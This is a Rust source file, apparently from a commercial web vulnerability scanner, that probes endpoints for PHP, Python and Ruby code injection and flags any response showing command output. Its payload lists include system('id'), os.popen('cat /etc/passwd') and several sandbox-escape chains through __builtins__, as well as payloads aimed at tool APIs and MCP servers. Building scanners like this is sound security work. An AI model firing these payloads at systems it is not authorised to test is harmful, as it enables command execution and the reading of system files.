// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

use crate::http_client::HttpClient;
use crate::scanners::parameter_filter::{ParameterFilter, ScannerType};
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use std::sync::Arc;
use std::time::Instant;
use tracing::{debug, info};

pub struct CodeInjectionScanner {
    http_client: Arc<HttpClient>,
    test_marker: String,
}

impl CodeInjectionScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        // Generate unique test marker
        let test_marker = format!("code_{}", uuid::Uuid::new_v4().to_string().replace("-", ""));
        Self {
            http_client,
            test_marker,
        }
    }

    /// Scan endpoint for code injection vulnerabilities
    pub async fn scan(
        &self,
        url: &str,
        _config: &ScanConfig,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        info!("Testing code injection vulnerabilities");

        // Test PHP code injection
        let (vulns, tests) = self.test_php_code_injection(url).await?;
        vulnerabilities.extend(vulns);
        tests_run += tests;

        // Test Python code injection
        if vulnerabilities.is_empty() {
            let (vulns, tests) = self.test_python_code_injection(url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;
        }

        // Test Ruby code injection
        if vulnerabilities.is_empty() {
            let (vulns, tests) = self.test_ruby_code_injection(url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;
        }

        // Test time-based code injection
        if vulnerabilities.is_empty() {
            let (vulns, tests) = self.test_time_based_injection(url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;
        }

        // Test JSON body code injection (for tool APIs, MCP servers, AI agents)
        // Context-aware: only test on endpoints that look like API endpoints
        if vulnerabilities.is_empty() && self.is_api_endpoint(url) {
            let (vulns, tests) = self.test_python_json_code_injection(url).await?;
            vulnerabilities.extend(vulns);
            tests_run += tests;
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Check if URL looks like an API endpoint (context-aware to reduce false positives)
    fn is_api_endpoint(&self, url: &str) -> bool {
        let url_lower = url.to_lowercase();
        url_lower.contains("/api/")
            || url_lower.contains("/v1/")
            || url_lower.contains("/v2/")
            || url_lower.contains("/tools/")
            || url_lower.contains("/run")
            || url_lower.contains("/execute")
            || url_lower.contains("/eval")
            || url_lower.contains("/invoke")
            || url_lower.contains("/function")
            || url_lower.contains("/rpc")
            || url_lower.contains("/graphql")
            || url_lower.ends_with(".json")
    }

    /// Test PHP eval() code injection
    async fn test_php_code_injection(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 5;

        // Smart parameter filtering - skip framework internals
        if ParameterFilter::should_skip_parameter("code", ScannerType::CommandInjection) {
            debug!("[Code] Skipping framework/internal parameter: code");
            return Ok((Vec::new(), 0));
        }

        info!("[Code] Testing PHP code injection (priority: {})",
              ParameterFilter::get_parameter_priority("code"));

        let payloads = vec![
            format!("phpinfo();echo '{}';", self.test_marker),
            format!("system('echo {}');", self.test_marker),
            format!("echo '{}';", self.test_marker),
            "phpinfo();".to_string(),
            "system('id');".to_string(),
        ];

        for payload in payloads {
            let test_url = if url.contains('?') {
                format!("{}&code={}", url, urlencoding::encode(&payload))
            } else {
                format!("{}?code={}", url, urlencoding::encode(&payload))
            };

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if self.detect_php_injection(&response.body) {
                        info!("PHP code injection detected");
                        vulnerabilities.push(self.create_vulnerability(
                            url,
                            "PHP Code Injection",
                            &payload,
                            "PHP code can be executed via eval() or similar functions",
                            &format!("PHP execution marker '{}' or phpinfo() output detected", self.test_marker),
                            Severity::Critical,
                            "CWE-94",
                        ));
                        break;
                    }
                }
                Err(e) => {
                    debug!("Request failed: {}", e);
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test Python exec()/eval() code injection
    async fn test_python_code_injection(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 20;

        debug!("Testing Python code injection");

        let payloads = vec![
            // Basic payloads
            format!("__import__('os').system('echo {}')", self.test_marker),
            format!("print('{}')", self.test_marker),
            "__import__('os').system('id')".to_string(),
            "1+1".to_string(),
            // Advanced os.popen payloads (from real-world exploitation)
            "import os\nos.popen('id').read()".to_string(),
            "__import__('os').popen('id').read()".to_string(),
            "__import__('os').popen('whoami').read()".to_string(),
            "os.popen('id').read()".to_string(),
            "os.popen('cat /etc/passwd').read()".to_string(),
            // Function definition injection (for tool APIs)
            "def exploit():\n    import os\n    return os.popen('id').read()".to_string(),
            "def darkshadow():\n    import os\n    data='0'.encode('utf-8')\n    return '+os.popen('id').read()".to_string(),
            // Subprocess module
            "__import__('subprocess').check_output(['id'])".to_string(),
            "__import__('subprocess').check_output('id',shell=True)".to_string(),
            "__import__('subprocess').getoutput('id')".to_string(),
            "__import__('subprocess').run(['whoami'],capture_output=True).stdout".to_string(),
            // Eval/exec chain
            "eval(compile('import os;os.system(\"id\")','','exec'))".to_string(),
            "exec('import os;print(os.popen(\"id\").read())')".to_string(),
            // builtins access
            "__builtins__.__import__('os').popen('id').read()".to_string(),
            "globals()['__builtins__']['__import__']('os').popen('id').read()".to_string(),
        ];

        for payload in payloads {
            let test_url = if url.contains('?') {
                format!("{}&code={}", url, urlencoding::encode(&payload))
            } else {
                format!("{}?code={}", url, urlencoding::encode(&payload))
            };

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if self.detect_python_injection(&response.body) {
                        info!("Python code injection detected");
                        vulnerabilities.push(self.create_vulnerability(
                            url,
                            "Python Code Injection",
                            &payload,
                            "Python code can be executed via exec() or eval()",
                            &format!("Python execution marker '{}' detected", self.test_marker),
                            Severity::Critical,
                            "CWE-94",
                        ));
                        break;
                    }
                }
                Err(e) => {
                    debug!("Request failed: {}", e);
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test Python code injection via JSON body (for tool APIs, MCP servers, etc.)
    /// This is context-aware for JSON-based function/tool definitions
    pub async fn test_python_json_code_injection(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 5;

        debug!("Testing Python code injection via JSON body (tool API context)");

        // Payloads specifically designed for source_code fields in tool APIs
        let source_code_payloads = vec![
            // Direct os module injection (as seen in real exploits)
            r#"def exploit():\n    import os\n    return os.popen('id').read()"#,
            r#"def darkshadow():\n    import os\n    data='0'.encode('utf-8')\n    return '+os.popen('id').read()"#,
            r#"import os\nos.system('id')"#,
            r#"__import__('os').popen('whoami').read()"#,
            r#"exec('import os;print(os.popen(\"id\").read())')"#,
        ];

        for payload in source_code_payloads {
            // JSON body with source_code field (common in tool APIs)
            let json_body = format!(
                r#"{{"name":"test","args":{{}},"json_schema":{{"type":"object","properties":{{}}}},"source_code":"{}"}}"#,
                payload.replace('"', "\\\"").replace('\n', "\\n")
            );

            match self.http_client.post(url, json_body).await {
                Ok(response) => {
                    if self.detect_python_injection(&response.body) {
                        info!("Python code injection via JSON body detected");
                        vulnerabilities.push(self.create_vulnerability(
                            url,
                            "Python Code Injection (JSON API)",
                            payload,
                            "Python code executed via source_code field in JSON body",
                            "Command output (uid=, gid=) detected in response",
                            Severity::Critical,
                            "CWE-94",
                        ));
                        break;
                    }
                }
                Err(e) => {
                    debug!("POST request failed: {}", e);
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test Ruby eval() code injection
    async fn test_ruby_code_injection(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 3;

        debug!("Testing Ruby code injection");

        let payloads = vec![
            format!("`echo {}`", self.test_marker),
            format!("system('echo {}')", self.test_marker),
            "1+1".to_string(),
        ];

        for payload in payloads {
            let test_url = if url.contains('?') {
                format!("{}&code={}", url, urlencoding::encode(&payload))
            } else {
                format!("{}?code={}", url, urlencoding::encode(&payload))
            };

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if self.detect_ruby_injection(&response.body) {
                        info!("Ruby code injection detected");
                        vulnerabilities.push(self.create_vulnerability(
                            url,
                            "Ruby Code Injection",
                            &payload,
                            "Ruby code can be executed via eval() or system()",
                            &format!("Ruby execution marker '{}' detected", self.test_marker),
                            Severity::Critical,
                            "CWE-94",
                        ));
                        break;
                    }
                }
                Err(e) => {
                    debug!("Request failed: {}", e);
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Test time-based code injection
    async fn test_time_based_injection(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let tests_run = 3;

        debug!("Testing time-based code injection");

        let time_payloads = vec![
            ("sleep(5)", "PHP"),
            ("time.sleep(5)", "Python"),
            ("sleep 5", "Ruby"),
        ];

        for (payload, lang) in time_payloads {
            let test_url = if url.contains('?') {
                format!("{}&code={}", url, urlencoding::encode(payload))
            } else {
                format!("{}?code={}", url, urlencoding::encode(payload))
            };

            let start = Instant::now();
            match self.http_client.get(&test_url).await {
                Ok(_response) => {
                    let elapsed = start.elapsed().as_secs_f64();

                    // If response took 4+ seconds, likely code injection
                    if elapsed >= 4.0 {
                        info!("Time-based code injection detected ({}s delay)", elapsed);
                        vulnerabilities.push(self.create_vulnerability(
                            url,
                            &format!("{} Code Injection (Time-based)", lang),
                            payload,
                            &format!("{} code execution detected via time delay", lang),
                            &format!("Response delayed by {:.2}s indicating code execution", elapsed),
                            Severity::Critical,
                            "CWE-94",
                        ));
                        break;
                    }
                }
                Err(e) => {
                    debug!("Request failed: {}", e);
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Detect PHP code injection
    fn detect_php_injection(&self, body: &str) -> bool {
        // Check for test marker
        if body.contains(&self.test_marker) {
            return true;
        }

        // Check for phpinfo() output
        let php_indicators = vec![
            "php version",
            "phpinfo()",
            "zend engine",
            "php credits",
            "_server[\"php_self\"]",
            "configuration file (php.ini)",
        ];

        let body_lower = body.to_lowercase();
        for indicator in php_indicators {
            if body_lower.contains(indicator) {
                return true;
            }
        }

        false
    }

    /// Detect Python code injection
    fn detect_python_injection(&self, body: &str) -> bool {
        // Check for test marker
        if body.contains(&self.test_marker) {
            return true;
        }

        // Check for Python output indicators
        let python_indicators = vec![
            "uid=",
            "gid=",
            "groups=",
        ];

        for indicator in python_indicators {
            if body.contains(indicator) {
                return true;
            }
        }

        false
    }

    /// Detect Ruby code injection
    fn detect_ruby_injection(&self, body: &str) -> bool {
        // Check for test marker
        if body.contains(&self.test_marker) {
            return true;
        }

        // Check for Ruby output indicators
        body.contains("uid=") || body.contains("gid=")
    }

    /// Create a vulnerability record
    fn create_vulnerability(
        &self,
        url: &str,
        vuln_type: &str,
        payload: &str,
        description: &str,
        evidence: &str,
        severity: Severity,
        cwe: &str,
    ) -> Vulnerability {
        let cvss = match severity {
            Severity::Critical => 10.0,
            Severity::High => 8.8,
            Severity::Medium => 6.5,
            _ => 4.3,
        };

        Vulnerability {
            id: format!("code_{}", uuid::Uuid::new_v4().to_string()),
            vuln_type: vuln_type.to_string(),
            severity,
            confidence: Confidence::High,
            category: "Code Injection".to_string(),
            url: url.to_string(),
            parameter: Some("code".to_string()),
            payload: payload.to_string(),
            description: description.to_string(),
            evidence: Some(evidence.to_string()),
            cwe: cwe.to_string(),
            cvss: cvss as f32,
            verified: true,
            false_positive: false,
            remediation: "1. NEVER use eval(), exec(), or similar functions with user input\n\
                         2. Use safe alternatives for dynamic functionality\n\
                         3. Implement strict input validation with allowlists\n\
                         4. Use sandboxed environments for code execution if absolutely necessary\n\
                         5. Disable dangerous PHP functions (eval, exec, system, passthru, shell_exec)\n\
                         6. Use static code analysis tools to detect eval() usage\n\
                         7. Implement least privilege principle for application processes\n\
                         8. Use secure configuration management instead of dynamic code\n\
                         9. Monitor for suspicious function calls in logs\n\
                         10. Consider using DSLs (Domain Specific Languages) instead of eval()".to_string(),
            discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_data: None,
        }
    }
}

// UUID generation helper
mod uuid {
    use rand::Rng;

    pub struct Uuid;

    impl Uuid {
        pub fn new_v4() -> Self {
            Uuid
        }

        pub fn to_string(&self) -> String {
            let mut rng = rand::rng();
            format!(
                "{:08x}{:04x}{:04x}{:04x}{:012x}",
                rng.random::<u32>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u64>() & 0xffffffffffff
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::detection_helpers::AppCharacteristics;
use crate::http_client::HttpClient;
    use std::sync::Arc;

    fn create_test_scanner() -> CodeInjectionScanner {
        let http_client = Arc::new(HttpClient::new(30, 3).unwrap());
        CodeInjectionScanner::new(http_client)
    }

    #[test]
    fn test_detect_php_injection_marker() {
        let scanner = create_test_scanner();
        let body = format!("Response contains {}", scanner.test_marker);

        assert!(scanner.detect_php_injection(&body));
    }

    #[test]
    fn test_detect_php_injection_phpinfo() {
        let scanner = create_test_scanner();

        let bodies = vec![
            "PHP Version 7.4.3",
            "Zend Engine v3.4.0",
            "Configuration File (php.ini) Path",
        ];

        for body in bodies {
            assert!(scanner.detect_php_injection(body));
        }
    }

    #[test]
    fn test_detect_python_injection() {
        let scanner = create_test_scanner();

        assert!(scanner.detect_python_injection(&format!("Output: {}", scanner.test_marker)));
        assert!(scanner.detect_python_injection("uid=1000(user) gid=1000(user)"));
    }

    #[test]
    fn test_detect_ruby_injection() {
        let scanner = create_test_scanner();

        assert!(scanner.detect_ruby_injection(&format!("Echo {}", scanner.test_marker)));
        assert!(scanner.detect_ruby_injection("uid=1000(user)"));
    }

    #[test]
    fn test_no_false_positives() {
        let scanner = create_test_scanner();
        let body = "Normal response without code execution";

        assert!(!scanner.detect_php_injection(body));
        assert!(!scanner.detect_python_injection(body));
        assert!(!scanner.detect_ruby_injection(body));
    }

    #[test]
    fn test_create_vulnerability() {
        let scanner = create_test_scanner();

        let vuln = scanner.create_vulnerability(
            "http://example.com",
            "PHP Code Injection",
            "phpinfo();",
            "PHP code injection detected",
            "phpinfo() output found",
            Severity::Critical,
            "CWE-94",
        );

        assert_eq!(vuln.vuln_type, "PHP Code Injection");
        assert_eq!(vuln.severity, Severity::Critical);
        assert_eq!(vuln.cwe, "CWE-94");
        assert_eq!(vuln.cvss, 10.0);
        assert!(vuln.verified);
    }

    #[test]
    fn test_unique_test_marker() {
        let scanner1 = create_test_scanner();
        let scanner2 = create_test_scanner();

        assert_ne!(scanner1.test_marker, scanner2.test_marker);
        assert!(scanner1.test_marker.starts_with("code_"));
    }
}
